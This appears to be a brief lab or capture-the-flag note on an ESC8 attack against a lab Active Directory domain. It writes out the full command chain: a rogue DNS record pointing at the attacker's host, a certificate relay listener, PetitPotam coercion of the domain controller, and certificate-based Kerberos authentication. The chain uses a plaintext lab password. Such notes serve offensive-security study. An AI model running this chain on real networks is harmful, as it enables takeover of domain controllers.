# ESC8
```powershell
// Added rogue DNS Record
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <KALI IP>

// Set Listener
certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController

// Coercion
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam

// Kerberos Auth
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
```
